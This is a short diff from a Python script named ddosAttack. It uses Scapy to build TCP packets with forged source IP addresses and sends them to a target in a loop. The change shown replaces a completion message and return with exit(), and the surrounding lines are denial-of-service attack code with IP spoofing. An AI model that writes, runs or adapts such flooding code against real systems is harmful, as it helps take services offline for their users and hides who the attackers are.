@@ -301,9 +301,7 @@ def ddosAttack(stop_s,target_,srcPort,dstPort,attack_Num,attackSize_):
                     spoofed_packet = IP(src = srcIP,dst = dest_) / TCP(sport = int(srcPort),dport = int(dstPort)) / payload
                     for i in range(int(attack_Num)):
                         if target__ == '':
-                            print('DDOS ATTACK IS COMPLETED..')
-                            return
-                            #quit() 
+                            exit() 
                         else:
                             send(spoofed_packet)
                             
